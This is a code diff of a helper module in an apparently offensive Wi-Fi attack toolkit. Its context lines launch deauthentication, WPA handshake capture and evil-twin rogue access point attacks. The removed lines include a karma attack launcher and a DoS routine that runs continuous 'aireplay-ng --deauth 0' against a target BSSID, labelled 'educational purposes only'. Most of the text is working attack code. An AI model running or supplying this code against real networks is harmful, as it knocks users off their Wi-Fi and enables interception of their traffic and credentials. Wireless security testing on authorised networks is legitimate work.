@@ -1,5 +1,5 @@
 """
-Helper functions for attack functionality.
+Helper functions for attack operations.
 """
 
 import os
@@ -11,8 +11,8 @@ import subprocess
 # Add the project root directory to Python path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
 
-from web.shared import config, logger, log_message, attack_state, stats
-from utils.network_utils import set_monitor_mode, set_managed_mode, is_monitor_mode
+from web.shared import config, logger, log_message
+from utils.network_utils import set_monitor_mode, set_managed_mode
 from attacks.deauth_attack import deauth_worker , deauth_worker_for_handshake
 from attacks.capture_attack import capture_worker
 from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network
@@ -25,6 +25,7 @@ def update_attack_progress(progress):
     Args:
         progress (int): The progress percentage (0-100)
     """
+    from web.shared import attack_state
     attack_state['progress'] = progress
     socketio.emit('attack_progress', {'progress': progress})
 
@@ -85,6 +86,7 @@ def launch_deauth_attack(network, attack_config):
             raise
     
     # Start deauth thread
+    from web.shared import attack_state
     deauth_thread = threading.Thread(
         target=deauth_worker,
         args=(bssid, client, config['interface'], count, interval, attack_state['stop_event']),
@@ -122,6 +124,7 @@ def launch_handshake_attack(network, attack_config):
     update_attack_progress(10)
     
     # Start capture thread
+    from web.shared import attack_state, stats
     capture_thread = threading.Thread(
         target=capture_worker,
         args=(bssid, channel, config['interface'], duration, 
@@ -186,6 +189,7 @@ def launch_evil_twin_attack(network, attack_config):
         update_attack_progress(30)
         
         # Start hostapd
+        from web.shared import attack_state
         hostapd_thread = threading.Thread(
             target=run_hostapd,
             args=(hostapd_conf, attack_state['stop_event']),
@@ -215,173 +219,6 @@ def launch_evil_twin_attack(network, attack_config):
         add_log_message("Failed to create required configuration files")
         raise Exception("Failed to create required configuration files")
 
-def launch_karma_attack(network, attack_config):
-    """
-    Launch a karma attack using the specified configuration.
-    
-    Args:
-        network (dict): The target network information
-        attack_config (dict): Configuration for the attack containing:
-            - essid: The network SSID to target
-            - scan_duration: Duration to run the attack in seconds
-    """
-    # Extract parameters
-    essid = attack_config.get('essid')
-    duration = attack_config.get('scan_duration', 20)  # Default 20 seconds
-    interface = config['interface']
-    
-    if not essid:
-        add_log_message("Error: No target ESSID provided")
-        raise ValueError("No target ESSID provided")
-    
-    # Set monitor mode
-    try:
-        add_log_message(f"Setting {interface} to monitor mode...")
-        # First check if already in monitor mode
-        if not is_monitor_mode(interface):
-            if not set_monitor_mode(interface):
-                add_log_message("Failed to set monitor mode")
-                raise RuntimeError("Failed to set monitor mode")
-        add_log_message(f"Interface {interface} is in monitor mode")
-    except Exception as e:
-        error_msg = str(e)
-        add_log_message(f"Error setting monitor mode: {error_msg}")
-        # Try to reset interface
-        try:
-            set_managed_mode(interface)
-        except:
-            pass  # Ignore cleanup errors
-        raise RuntimeError(f"Failed to set monitor mode: {error_msg}")
-    
-    # Start karma attack thread
-    try:
-        from attacks.karma_attack import karma_worker
-        
-        karma_thread = threading.Thread(
-            target=karma_worker,
-            args=(interface, essid, duration, attack_state['stop_event']),
-            daemon=True
-        )
-        
-        attack_state['threads'].append(karma_thread)
-        karma_thread.start()
-        
-        add_log_message(f"Karma attack started targeting SSID: {essid}")
-        update_attack_progress(10)  # Initial progress
-        
-    except Exception as e:
-        add_log_message(f"Error starting karma attack: {e}")
-        try:
-            set_managed_mode(interface)
-        except:
-            pass  # Ignore cleanup errors
-        raise
-
-#!/usr/bin/env python3
-# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
-def dos_attack(bssid, channel, interface):
-    """Launch a DoS attack using aireplay-ng
-    
-    Args:
-        bssid (str): Target BSSID
-        channel (str): Target channel
-        interface (str): Wireless interface to use
-    """
-    # Set monitor mode using the network_utils function
-    add_log_message(f"[DoS] Setting {interface} to monitor mode...")
-    set_monitor_mode(interface)
-    update_attack_progress(10)
-    
-    # Set channel
-    try:
-        add_log_message(f"[DoS] Setting channel to {channel}...")
-        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
-        add_log_message(f"[DoS] Channel set to {channel}")
-    except subprocess.CalledProcessError as e:
-        add_log_message(f"[DoS] Error setting channel: {e}")
-        set_managed_mode(interface)
-        raise
-    
-    update_attack_progress(20)
-    
-    # Start DoS attack in a separate thread
-    dos_thread = threading.Thread(
-        target=run_dos_attack,
-        args=(bssid, interface, attack_state['stop_event']),
-        daemon=True
-    )
-    
-    attack_state['threads'].append(dos_thread)
-    dos_thread.start()
-    add_log_message(f"[DoS] Attack started against {bssid}")
-    update_attack_progress(30)
-
-def run_dos_attack(bssid, interface, stop_event):
-    """Run the DoS attack until stopped using aireplay-ng
-    
-    Args:
-        bssid (str): Target BSSID
-        interface (str): Wireless interface to use
-        stop_event (threading.Event): Event to signal when to stop
-    """
-    add_log_message(f"[DoS] Launching aireplay-ng deauth attack on BSSID {bssid}")
-    
-    # Prepare aireplay-ng command
-    aireplay_cmd = [
-        'sudo', 'aireplay-ng',
-        '--deauth', '0',  # Continuous deauth
-        '-a', bssid,      # Target BSSID
-        interface          # Interface
-    ]
-    
-    try:
-        # Start aireplay-ng process
-        process = subprocess.Popen(
-            aireplay_cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            bufsize=1  # Line buffered
-        )
-        
-        add_log_message(f"[DoS] aireplay-ng started with PID {process.pid}")
-        update_attack_progress(50)
-        
-        # Monitor the process and check for stop signal
-        while process.poll() is None and not stop_event.is_set():
-            # Check for output from aireplay-ng
-            try:
-                # Use select to avoid blocking
-                import select
-                readable, _, _ = select.select([process.stdout, process.stderr], [], [], 0.5)
-                
-                for stream in readable:
-                    line = stream.readline()
-                    if line:
-                        add_log_message(f"[aireplay-ng] {line.strip()}")
-            except Exception as e:
-                add_log_message(f"[DoS] Error reading aireplay-ng output: {e}")
-            
-            # Check stop signal every 0.5 seconds
-            stop_event.wait(0.5)
-        
-        # If we get here, either the process ended or we were asked to stop
-        if process.poll() is None:  # Process is still running
-            add_log_message("[DoS] Stopping aireplay-ng...")
-            process.terminate()
-            try:
-                process.wait(timeout=5)  # Wait up to 5 seconds for graceful termination
-            except subprocess.TimeoutExpired:
-                add_log_message("[DoS] aireplay-ng did not terminate gracefully, killing.")
-                process.kill()
-    
-    except Exception as e:
-        add_log_message(f"[DoS] Error during aireplay-ng attack: {e}")
-    
-    # Attack has been stopped
-    add_log_message("[DoS] Attack stopped")
-    update_attack_progress(100)
-    
 def run_hostapd(config_file, stop_event):
     """
     Run hostapd with the specified configuration file.
